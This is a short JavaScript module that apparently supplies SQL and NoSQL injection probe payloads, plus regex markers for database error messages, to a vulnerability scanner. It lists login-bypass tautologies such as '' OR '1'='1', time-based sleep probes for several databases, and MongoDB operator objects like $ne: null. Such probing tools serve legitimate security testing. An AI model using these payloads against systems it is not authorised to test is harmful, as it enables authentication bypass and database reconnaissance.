/**
 * Safe, non-destructive SQLi probe payloads only.
 * No dump / stacked destructive / data-altering payloads.
 */
module.exports = {
  ERROR_STRING: [
    "'",
    "\"",
    "')",
    "admin'--",
    "' OR '1'='1",
  ],
  BOOLEAN_TRUE: ["' OR '1'='1' -- ", "1 OR 1=1"],
  BOOLEAN_FALSE: ["' OR '1'='2' -- ", "1 OR 1=2"],
  TIME_BASED: [
    "'||pg_sleep(3)||'",
    "1' OR SLEEP(3)-- ",
    "1; WAITFOR DELAY '0:0:3'--",
  ],
  NOSQL_OPERATORS: [
    { email: { $ne: null }, password: { $ne: null } },
    { email: { $gt: '' }, password: { $gt: '' } },
  ],
  SQL_ERROR_MARKERS: [
    /sql syntax/i,
    /mysql/i,
    /mariadb/i,
    /postgres/i,
    /postgresql/i,
    /oracle/i,
    /sqlite/i,
    /odbc/i,
    /sqlstate/i,
    /unclosed quotation mark/i,
    /quoted string not properly terminated/i,
    /syntax error at or near/i,
    /microsoft ole db/i,
    /odbc sql server driver/i,
  ],
  NOSQL_ERROR_MARKERS: [
    /mongoose/i,
    /cast to objectid/i,
    /\$limit stage/i,
    /\$skip stage/i,
    /mongodb/i,
    /bson/i,
    /location51091/i,
    /invalid regular expression/i,
  ],
};
